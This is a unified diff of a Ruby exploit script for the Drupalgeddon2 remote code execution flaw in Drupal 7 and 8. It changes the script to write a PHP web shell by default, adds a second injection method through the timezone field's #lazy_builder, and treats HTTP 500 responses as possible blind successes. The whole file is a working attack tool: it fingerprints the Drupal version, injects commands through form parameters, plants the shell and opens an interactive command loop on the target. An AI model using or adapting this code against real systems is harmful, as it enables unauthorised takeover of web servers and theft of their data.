@@ -16,11 +16,11 @@ require "readline"
 
 
 # Settings - Try to write a PHP to the web root?
-try_phpshell = false
+try_phpshell = true
 # Settings - General
 $useragent = "drupalgeddon2"
 webshell = "s.php"
-$verbose = true
+$verbose = false
 
 
 # Settings - Proxy information (nil to disable)
@@ -56,32 +56,36 @@ def http_request(url, type="get", payload="")
   rescue Timeout::Error => e
     puts error("The target timed out ~ #{e.message}")
   end
+
+  # If we got here, something went wrong.
   exit
 end
 
 
-# Function gen_evil_url <cmd> [shell] [phpfunction]
-def gen_evil_url(evil, shell=false, phpfunction="exec") #passthru
+# Function gen_evil_url <cmd> [method] [shell] [phpfunction]
+def gen_evil_url(evil, element="", shell=false, phpfunction="passthru")
   puts info("Payload: #{evil}") if not shell
+  puts verbose("Element    : #{element}") if not shell and not element.empty? and $verbose
   puts verbose("PHP fn     : #{phpfunction}") if not shell and $verbose
 
+  # Vulnerable parameters: #access_callback / #lazy_builder / #pre_render / #post_render
   # Check the version to match the payload
-  # Vulnerable Parameters: #access_callback / #lazy_builder / #pre_render / #post_render
-  if $drupalverion.start_with?("8")
-    # Method #1 - Drupal v8.x, mail, #post_render - response is 200
+  if $drupalverion.start_with?("8") and element == "mail"
+    # Method #1 - Drupal v8.x: mail, #post_render - HTTP 200
     url = $target + $clean_url + $form + "?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
     payload = "form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=" + phpfunction + "&mail[a][#type]=markup&mail[a][#markup]=" + evil
 
-    # Method #2 - Drupal v8.x,  timezone, #lazy_builder - response is 500 & blind (will need to disable target check for this to work!)
-    #url = $target + $clean_url + $form + "?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
-    #payload = "form_id=user_register_form&_drupal_ajax=1&timezone[a][#lazy_builder][]=" + phpfunction + "&timezone[a][#lazy_builder][][]=" + evil
-  elsif $drupalverion.start_with?("7")
-    # Method #3 - Drupal v7.x, name, #post_render - response is 200
+  elsif $drupalverion.start_with?("8") and element == "timezone"
+    # Method #2 - Drupal v8.x: timezone, #lazy_builder - HTTP 500 if phpfunction=exec // HTTP 200 if phpfunction=passthru
+    url = $target + $clean_url + $form + "?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
+    payload = "form_id=user_register_form&_drupal_ajax=1&timezone[a][#lazy_builder][]=" + phpfunction + "&timezone[a][#lazy_builder][][]=" + evil
+
+    #puts warning("WARNING: May benefit to use a PHP web shell") if not try_phpshell and phpfunction != "passthru"
+
+  elsif $drupalverion.start_with?("7") and element == "name"
+    # Method #3 - Drupal v7.x: name, #post_render - HTTP 200
     url = $target + "#{$clean_url}#{$form}&name[%23post_render][]=" + phpfunction + "&name[%23type]=markup&name[%23markup]=" + evil
     payload = "form_id=user_pass&_triggering_element_name=name"
-  else
-    puts error("Unsupported Drupal version: #{$drupalverion}")
-    exit
   end
 
   # Drupal v7.x needs an extra value from a form
@@ -90,6 +94,7 @@ def gen_evil_url(evil, shell=false, phpfunction="exec") #passthru
 
     form_name = "form_build_id"
     puts verbose("Form name  : #{form_name}") if $verbose
+
     form_value = response.body.match(/input type="hidden" name="#{form_name}" value="(.*)"/).to_s.slice(/value="(.*)"/, 1).to_s.strip
     puts warning("WARNING: Didn't detect #{form_name}") if form_value.empty?
     puts verbose("Form value : #{form_value}") if $verbose
@@ -120,6 +125,10 @@ def clean_result(input)
   # Newer PHP for an older Drupal
   # For: <b>Deprecated</b>:  assert(): Calling assert() with a string argument is deprecated in <b>/var/www/html/core/lib/Drupal/Core/Plugin/DefaultPluginManager.php</b> on line <b>151</b><br />
   #clean.slice!(/<b>.*<br \/>/)
+
+  # Drupal v8.x Method #2 ~ timezone, #lazy_builder, passthru, HTTP 500
+  # For: <b>Deprecated</b>:  assert(): Calling assert() with a string argument is deprecated in <b>/var/www/html/core/lib/Drupal/Core/Plugin/DefaultPluginManager.php</b> on line <b>151</b><br />
+  clean.slice!(/The website encountered an unexpected error.*/)
 
   return clean
 end
@@ -176,13 +185,9 @@ $target = ARGV[0]
 
 
 # Check input for protocol
-if not $target.start_with?("http")
-  $target = "http://#{$target}"
-end
+$target = "http://#{$target}" if not $target.start_with?("http")
 # Check input for the end
-if not $target.end_with?("/")
-  $target += "/"
-end
+$target += "/" if not $target.end_with?("/")
 
 
 # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
@@ -217,6 +222,7 @@ end
 
 # Try and get version
 $drupalverion = ""
+
 # Possible URLs
 url = [
   # Drupal 6 / 7 / 8
@@ -230,6 +236,7 @@ url = [
   #$target + "includes/database/database.inc",
   #$target + "core/includes/database.inc",
 ]
+
 # Check all
 url.each do|uri|
   # Check response
@@ -238,6 +245,7 @@ url.each do|uri|
   # Check header
   if response['X-Generator']
     header = response['X-Generator'].slice(/Drupal (.*) \(https:\/\/www.drupal.org\)/, 1).to_s.strip
+
     if $drupalverion.empty? and not header.empty?
       $drupalverion = "#{header}.x"
       puts success("Header : X-Generator    (v#{$drupalverion})")
@@ -263,21 +271,29 @@ url.each do|uri|
 
     # Try and get version from the file contents (For Drupal v8.4.x/v7.x)
     $drupalverion = response.body.match(/Drupal (.*),/).to_s.slice(/Drupal (.*),/, 1).to_s.strip
+    # Blank if not vaid
     $drupalverion = "" if not $drupalverion[-1] =~ /\d/
 
     # If not, try and get it from the URL (For Drupal v6.x)
     $drupalverion = uri.match(/includes\/database.inc/)? "6.x" : "" if $drupalverion.empty?
     # If not, try and get it from the URL (For Drupal v8.5.x)
-    $drupalverion = uri.match(/core/)? "8.x" : "7.x" if $drupalverion.empty?
+    $drupalverion = uri.match(/core/)? "8.x" : "" if $drupalverion.empty?
+    # Fall back
+    $drupalverion = "7.x" if $drupalverion.empty?
 
-    # Done! ...if a full known version
+    # Done! ...if a full known version, else keep going... may get lucky later!
     break if not $drupalverion.end_with?("x")
+
   elsif response.code == "403"
     puts success("Found  : #{uri}    (HTTP Response: #{response.code})")
 
-    # Get version from URL
+    # If not, try and get it from the URL (For Drupal v6.x)
     $drupalverion = uri.match(/includes\/database.inc/)? "6.x" : "" if $drupalverion.empty?
-    $drupalverion = uri.match(/core/)? "8.x" : "7.x" if $drupalverion.empty?
+    # If not, try and get it from the URL (For Drupal v8.5.x)
+    $drupalverion = uri.match(/core/)? "8.x" : "" if $drupalverion.empty?
+    # Fall back
+    $drupalverion = "7.x" if $drupalverion.empty?
+
   else
     puts warning("MISSING: #{uri}    (HTTP Response: #{response.code})")
   end
@@ -292,8 +308,9 @@ else
   puts error("Didn't detect Drupal version")
   exit
 end
+
 if not $drupalverion.start_with?("8") and not $drupalverion.start_with?("7")
-  puts error("Unsupported Drupal version")
+  puts error("Unsupported Drupal version (#{$drupalverion})")
   exit
 end
 puts "-"*80
@@ -307,6 +324,7 @@ puts "-"*80
 
 # The attack vector to use
 $form = $drupalverion.start_with?("8")? "user/register" : "user/password"
+
 # Make a request, check for form
 url = "#{$target}?q=#{$form}"
 puts action("Testing: Form   (#{$form})")
@@ -337,6 +355,7 @@ puts "- "*40
 # Drupal v7.x needs it anyway
 $clean_url = $drupalverion.start_with?("8")? "" : "?q="
 url = "#{$target}#{$form}"
+
 puts action("Testing: Clean URLs")
 response = http_request(url)
 if response.code == "200" and not response.body.empty?
@@ -360,37 +379,64 @@ puts "-"*80
 # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
 
 
+# Values in gen_evil_url for Drupal v8.x
+elementsv8 = [
+  "mail",
+  "timezone",
+]
+# Values in gen_evil_url for Drupal v7.x
+elementsv7 = [
+  "name",
+]
 
-# Make a request, testing code execution
-puts action("Testing: Code Execution")
-# Generate a random string to see if we can echo it
-random = (0...8).map { (65 + rand(26)).chr }.join
-url, payload = gen_evil_url("echo #{random}")
-response = http_request(url, "post", payload)
-if response.code == "200" and not response.body.empty?
-  result = clean_result(response.body)
-  if not result.empty?
-    puts success("Result : #{result}")
+elements = $drupalverion.start_with?("8") ? elementsv8 : elementsv7
 
-    if response.body.match(/#{random}/)
-      puts success("Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!")
+elements.each do|e|
+  $element = e
+
+  # Make a request, testing code execution
+  puts action("Testing: Code Execution   (Method: #{$element})")
+
+  # Generate a random string to see if we can echo it
+  random = (0...8).map { (65 + rand(26)).chr }.join
+  url, payload = gen_evil_url("echo #{random}", e)
+
+  response = http_request(url, "post", payload)
+  if (response.code == "200" or response.code == "500") and not response.body.empty?
+    result = clean_result(response.body)
+    if not result.empty?
+      puts success("Result : #{result}")
+
+      if response.body.match(/#{random}/)
+        puts success("Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!")
+        break
+
+      else
+        puts warning("WARNING: Target MIGHT be exploitable [4]...   Detected output, but didn't MATCH expected result")
+      end
+
     else
-      puts warning("WARNING: Target MIGHT be exploitable [4]...   Detected output, but didn't MATCH expected result")
-      puts verbose("result: #{result}") if $verbose
-      puts verbose("response.body: #{response.body}") if $verbose
+      puts warning("WARNING: Target MIGHT be exploitable [3] (HTTP Response: #{response.code})...   Didn't detect any INJECTED output (disabled PHP function?)")
     end
-  else
-    puts warning("WARNING: Target MIGHT be exploitable [3] (HTTP Response: #{response.code})...   Didn't detect any INJECTED output (disabled PHP function?)")
+
+    puts warning("WARNING: Target MIGHT be exploitable [5]...   Blind attack?") if response.code == "500"
+
     puts verbose("response.body: #{response.body}") if $verbose
+    puts verbose("clean_result: #{result}") if not result.empty? and $verbose
+
+  elsif response.body.empty?
+    puts error("Target is NOT exploitable [2] (HTTP Response: #{response.code})...   Got an empty response")
+    exit
+
+  else
+    puts error("Target is NOT exploitable [1] (HTTP Response: #{response.code})")
+    puts verbose("response.body: #{response.body}") if $verbose
+    exit
   end
-elsif response.body.empty?
-  puts error("Target is NOT exploitable [2] (HTTP Response: #{response.code})...   Got an empty response")
-  exit
-else
-  puts error("Target is NOT exploitable [1] (HTTP Response: #{response.code})")
-  puts verbose("response.body: #{response.body}") if $verbose
-  exit
+
+  puts "- "*40 if e != elements.last
 end
+
 puts "-"*80
 
 
@@ -400,6 +446,7 @@ puts "-"*80
 # Location of web shell & used to signal if using PHP shell
 webshellpath = ""
 prompt = "drupalgeddon2"
+
 # Possibles paths to try
 paths = [
   # Web root
@@ -414,6 +461,7 @@ paths = [
 paths.each do|path|
   # Check to see if there is already a file there
   puts action("Testing: Existing file   (#{$target}#{path}#{webshell})")
+
   response = http_request("#{$target}#{path}#{webshell}")
   if response.code == "200"
     puts warning("Response: HTTP #{response.code} // Size: #{response.size}.   Something could already be there?")
@@ -444,7 +492,7 @@ paths.each do|path|
   end
 
   # Generate evil URLs
-  url, payload = gen_evil_url(cmd)
+  url, payload = gen_evil_url(cmd, $element)
   # Make the request
   response = http_request(url, "post", payload)
   # Check result
@@ -458,26 +506,39 @@ paths.each do|path|
     if response.code == "200" and not response.body.empty?
       puts success("Very Good News Everyone! Wrote to the web root! Waayheeeey!!!")
       break
+
     elsif response.code == "404"
       puts warning("Target is NOT exploitable [2-4] (HTTP Response: #{response.code})...   Might not have write access?")
+
     elsif response.code == "403"
       puts warning("Target is NOT exploitable [2-3] (HTTP Response: #{response.code})...   May not be able to execute PHP from here?")
+
     elsif response.body.empty?
       puts warning("Target is NOT exploitable [2-2] (HTTP Response: #{response.code})...   Got an empty response back")
+
     else
       puts warning("Target is NOT exploitable [2-1] (HTTP Response: #{response.code})")
       puts verbose("response.body: #{response.body}") if $verbose
     end
+
+  elsif response.code == "500" and not response.body.empty?
+    puts warning("Target MAY of been exploited... Bit of blind leading the blind")
+    break
+
   elsif response.code == "404"
-      puts warning("Target is NOT exploitable [1-4] (HTTP Response: #{response.code})...   Might not have write access?")
+    puts warning("Target is NOT exploitable [1-4] (HTTP Response: #{response.code})...   Might not have write access?")
+
   elsif response.code == "403"
-      puts warning("Target is NOT exploitable [1-3] (HTTP Response: #{response.code})...   May not be able to execute PHP from here?")
+    puts warning("Target is NOT exploitable [1-3] (HTTP Response: #{response.code})...   May not be able to execute PHP from here?")
+
   elsif response.body.empty?
     puts warning("Target is NOT exploitable [1-2] (HTTP Response: #{response.code}))...   Got an empty response back")
+
   else
     puts warning("Target is NOT exploitable [1-1] (HTTP Response: #{response.code})")
     puts verbose("response.body: #{response.body}") if $verbose
   end
+
   webshellpath = ""
 
   puts "- "*40 if path != paths.last
@@ -486,9 +547,8 @@ end if try_phpshell
 # If a web path was set, we exploited using PHP!
 if not webshellpath.empty?
   # Get hostname for the prompt
-  prompt = response.body.to_s.strip
+  prompt = response.body.to_s.strip if response.code == "200" and not response.body.empty?
 
-  # Feedback
   puts "-"*80
   puts info("Fake PHP shell:   curl '#{$target}#{webshellpath}' -d 'c=hostname'")
 # Should we be trying to call commands via PHP?
@@ -520,17 +580,17 @@ loop do
   # Blank link?
   next if command.empty?
 
-  # If PHP shell
+  # If PHP web shell
   if not webshellpath.empty?
     # Send request
     result = http_request("#{$target}#{webshell}", "post", "c=#{command}").body
   # Direct OS commands
   else
-    url, payload = gen_evil_url(command, true)
+    url, payload = gen_evil_url(command, $element, true)
     response = http_request(url, "post", payload)
 
     # Check result
-    if response.code == "200" and not response.body.empty?
+    if not response.body.empty?
       result = clean_result(response.body)
     end
   end
